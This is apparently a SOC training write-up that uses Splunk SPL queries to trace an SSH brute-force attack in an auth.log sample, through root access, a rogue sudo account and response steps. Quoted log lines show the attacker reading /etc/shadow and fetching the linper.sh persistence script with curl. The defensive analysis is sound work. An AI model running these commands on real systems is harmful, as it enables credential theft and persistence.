
# Linux Authentication Log Investigation Using Splunk

## 1. Project Overview

In this project, I used **Splunk SIEM** to investigate Linux authentication logs (`auth.log`) and identify suspicious SSH authentication activity.

The objective was to:

- Analyze authentication events.
- Identify failed SSH login attempts.
- Identify suspicious source IP addresses.
- Determine which accounts were targeted.
- Investigate successful authentication following multiple failures.
- Identify possible account compromise.
- Investigate post-compromise activity.
- Build an investigation timeline using authentication logs.

The investigation was performed using a sample `auth.log` dataset that I uploaded into Splunk.

---

# 2. Tools Used

- **Splunk SIEM**
- **SPL (Search Processing Language)**
- Linux `auth.log`
- SSH authentication logs

---

# 3. Dataset

The project uses a sample Linux `auth.log` file containing SSH authentication, user management, sudo, cron, and other authentication-related events.

I uploaded the dataset into Splunk and configured the appropriate index and sourcetype so that the events could be searched using SPL.

---

# 4. Investigation Methodology

I followed the following SOC investigation workflow:

**Log ingestion → Authentication analysis → Failed login detection → Source IP analysis → Targeted account analysis → Successful login correlation → Privilege escalation investigation → Account creation investigation → Post-compromise activity → Timeline reconstruction → Conclusion**

---

# 5. Data Ingestion into Splunk

I first uploaded the `auth.log` dataset into Splunk.

### Steps performed

1. Logged into Splunk.
2. Navigated to **Settings → Add Data**.
3. Selected **Upload**.
4. Selected the `auth.log` dataset.
5. Configured the index.
6. Configured the sourcetype.
7. Reviewed the data input configuration.
8. Submitted the file.

After ingestion, I verified that the authentication events were searchable in Splunk.

### Initial Search

```spl
index=* sourcetype=auth_logs
```

This allowed me to verify that the uploaded authentication events were available for analysis.

---

# 6. Step 1 — Review Authentication Events

I started by reviewing the authentication events to understand the normal structure of the logs.

I looked for events generated by:

- `sshd`
- `pam_unix`
- `sudo`
- `useradd`
- `usermod`
- `passwd`
- `systemd-logind`

The `sshd` events were particularly important because they contained authentication attempts, source IP addresses, usernames, successful logins, and failed login attempts.

---

# 7. Step 2 — Search for Failed SSH Authentication

I searched for failed password attempts using:

```spl
index=* sourcetype=auth_logs "Failed password"
```

The purpose of this search was to identify unsuccessful SSH authentication attempts.

I reviewed:

- Source IP
- Username
- Timestamp
- SSH process
- Authentication result

The investigation showed a large number of failed authentication attempts originating from:

```text
65.2.161.68
```

---

# 8. Step 3 — Identify the Top Source IPs

I then grouped failed authentication attempts by source IP.

```spl
index=* sourcetype=auth_logs "Failed password"
| rex "from (?<src_ip>\d+\.\d+\.\d+\.\d+)"
| stats count by src_ip
| sort - count
```

### Analysis

The source IP:

```text
65.2.161.68
```

generated the observed failed authentication activity.

This made the IP the primary source of interest for further investigation.

---

# 9. Step 4 — Identify Targeted User Accounts

Next, I investigated which accounts were being targeted.

```spl
index=* sourcetype=auth_logs "Failed password"
| rex "Failed password for (?:invalid user )?(?<user>\S+)"
| stats count by user
| sort - count
```

The investigation identified attempts against several usernames, including:

- `admin`
- `backup`
- `server_adm`
- `svc_account`
- `root`

The presence of multiple usernames from the same source suggested that the activity was not limited to a single-user authentication failure.

This pattern is consistent with an automated SSH password attack or account enumeration followed by password attempts.

---

# 10. Step 5 — Investigate Invalid Users

I searched specifically for attempts against accounts that did not exist.

```spl
index=* sourcetype=auth_logs "Invalid user"
```

I observed repeated attempts against usernames such as:

```text
admin
server_adm
svc_account
```

The same source IP was responsible for these attempts.

This provided additional evidence that the source was attempting to discover or access commonly named accounts.

---

# 11. Step 6 — Investigate Authentication Failures

I then searched for PAM authentication failures.

```spl
index=* sourcetype=auth_logs "authentication failure"
```

This showed repeated authentication failures originating from the same remote source.

I compared these events with the failed-password events to understand the complete authentication sequence.

---

# 12. Step 7 — Investigate SSH Connection Throttling

I searched for SSH connection-management events.

```spl
index=* sourcetype=auth_logs "MaxStartups"
```

The logs showed:

```text
exited MaxStartups throttling after 00:01:08, 21 connections dropped
```

This was an important finding.

The SSH service had received enough simultaneous connection attempts that `MaxStartups` throttling was triggered and **21 connections were dropped**.

This strongly supports the conclusion that the authentication activity was highly aggressive rather than normal interactive login behavior.

---

# 13. Step 8 — Search for Successful Authentication

After identifying the failed authentication activity, I searched for successful SSH logins.

```spl
index=* sourcetype=auth_logs "Accepted password"
```

I then reviewed successful authentication events involving the suspicious source IP.

The critical event was:

```text
Accepted password for root from 65.2.161.68
```

This occurred at approximately:

```text
06:31:40
```

This was significant because the same IP had generated numerous failed authentication attempts immediately beforehand.

---

# 14. Step 9 — Correlate Failed and Successful Authentication

I then investigated the sequence of events surrounding the successful root login.

```spl
index=* sourcetype=auth_logs
("Failed password" OR "Accepted password")
| rex "from (?<src_ip>\d+\.\d+\.\d+\.\d+)"
| stats count values(user) as users by src_ip
| sort - count
```

I also reviewed the raw events around the suspicious timestamp.

### Observation

The sequence was:

```text
Multiple failed SSH authentication attempts
        ↓
Multiple usernames targeted
        ↓
SSH MaxStartups throttling
        ↓
Successful root authentication
```

This correlation significantly increased the severity of the incident.

---

# 15. Step 10 — Investigate the Root Session

After identifying the successful root login, I searched for subsequent root activity.

```spl
index=* sourcetype=auth_logs user=root
```

I specifically reviewed events occurring after the successful authentication.

A second successful root authentication from the same source IP was observed at approximately:

```text
06:32:44
```

A root session was opened immediately afterward.

This indicated that the suspicious source had obtained authenticated access to the system.

---

# 16. Step 11 — Investigate New Account Creation

I then searched for account-management events.

```spl
index=* sourcetype=auth_logs
("new user" OR "useradd" OR "groupadd")
```

The investigation identified the creation of a new account:

```text
cyberjunkie
```

The account was created at approximately:

```text
06:34:18
```

The password was changed shortly afterward.

This was highly suspicious because the account was created shortly after the suspicious root authentication.

---

# 17. Step 12 — Investigate Privilege Assignment

I searched for changes to group membership.

```spl
index=* sourcetype=auth_logs
("usermod" OR "sudo")
```

The logs showed:

```text
add 'cyberjunkie' to group 'sudo'
```

This occurred at approximately:

```text
06:35:15
```

The new account therefore received sudo privileges.

### Analysis

The sequence:

```text
Root access
   ↓
New user created
   ↓
User added to sudo group
```

is a strong indicator of possible attacker persistence and privilege management following compromise.

---

# 18. Step 13 — Investigate SSH Login Using the New Account

I then searched for successful authentication involving the newly created account.

```spl
index=* sourcetype=auth_logs "Accepted password" "cyberjunkie"
```

The logs showed:

```text
Accepted password for cyberjunkie from 65.2.161.68
```

at approximately:

```text
06:37:34
```

This was significant because the same suspicious source IP that had previously authenticated as root was now authenticating as the newly created `cyberjunkie` account.

---

# 19. Step 14 — Investigate Sudo Activity

I searched for sudo activity:

```spl
index=* sourcetype=auth_logs "sudo:"
```

One particularly important event was:

```text
sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
```

### Analysis

The `cyberjunkie` account used sudo to execute:

```text
/usr/bin/cat /etc/shadow
```

The `/etc/shadow` file contains password-hash information for local accounts.

This indicates that the newly created account was being used to access sensitive authentication information with root privileges.

---

# 20. Step 15 — Investigate Further Post-Compromise Activity

I continued investigating sudo activity after the `/etc/shadow` access.

```spl
index=* sourcetype=auth_logs "COMMAND="
```

Another suspicious event was observed:

```text
sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

This occurred at approximately:

```text
06:39:38
```

The command used `curl` to retrieve a shell script from GitHub.

The event should be treated as suspicious post-compromise activity because it occurred after the account was created, granted sudo privileges, and used to access `/etc/shadow`.

Further investigation would be required to determine exactly what the downloaded script was used for.

# 22. Investigation Findings

### Finding 1 — SSH Brute-Force / Password Attack

A single remote source, `65.2.161.68`, generated a large burst of SSH authentication failures against multiple usernames.

The activity included invalid accounts and valid accounts such as `backup` and `root`.

**Assessment: Suspicious / High severity**

---

### Finding 2 — SSH Connection Flood

The SSH daemon entered `MaxStartups` throttling and dropped 21 connections.

**Assessment: Strong indicator of automated/high-volume SSH activity**

---

### Finding 3 — Successful Root Authentication

The suspicious source successfully authenticated as `root` shortly after the failed authentication activity.

**Assessment: Critical**

This changes the investigation from a failed brute-force attempt to a **potential successful compromise**.

---

### Finding 4 — New Privileged Account

A new account named `cyberjunkie` was created shortly after the root login and added to the sudo group.

**Assessment: Highly suspicious**

This could represent attacker-created persistence or privileged account creation.

---

### Finding 5 — Sensitive File Access

The newly created account used sudo to execute\:the con

```text
cat /etc/shadow
```

**Assessment: High severity**

This indicates access to sensitive local authentication information.

---

### Finding 6 — Post-Compromise Command Execution

The account subsequently used sudo to download:

```text
linper.sh
```

using `curl`.

**Assessment: Suspicious post-compromise activity**

Additional host and process investigation would be required to determine the script's purpose and whether it resulted in further compromise.

---

# 23. Incident Conclusion

Based on the available `auth.log` evidence, the activity is consistent with a **successful SSH compromise originating from `65.2.161.68`**.

The observed attack chain was:

```text
External SSH activity
        ↓
Multiple failed authentication attempts
        ↓
Multiple accounts targeted
        ↓
SSH MaxStartups throttling
        ↓
Successful root authentication
        ↓
New account: cyberjunkie
        ↓
Account added to sudo group
        ↓
SSH login as cyberjunkie
        ↓
Access to /etc/shadow
        ↓
Download of linper.sh using sudo
```

The most important indicator is that the same source IP associated with the brute-force activity subsequently obtained successful root access and was followed by privileged account creation and suspicious sudo activity.

I would therefore classify this incident as:

**Severity: Critical**

**Incident Type: SSH Brute Force / Credential Compromise / Privileged Account Abuse**

---

# 24. Recommended SOC Response

Based on this log evidence, the following response actions would be appropriate:

1. Isolate the affected host from the network.
2. Block or investigate the source IP `65.2.161.68`.
3. Disable or remove the suspicious `cyberjunkie` account after preserving evidence.
4. Review all members of the sudo group.
5. Rotate credentials for potentially compromised accounts.
6. Investigate the root account and determine whether its credentials were compromised.
7. Review `/etc/shadow` access and account password hashes.
8. Investigate the downloaded `linper.sh` script.
9. Review shell history, process execution, and filesystem changes.
10. Search other systems for connections from `65.2.161.68`.
11. Review SSH configuration and authentication controls.
12. Consider disabling direct root SSH login.
13. Implement stronger SSH authentication controls such as key-based authentication and MFA where supported.
14. Continue monitoring for further authentication attempts from the same source.
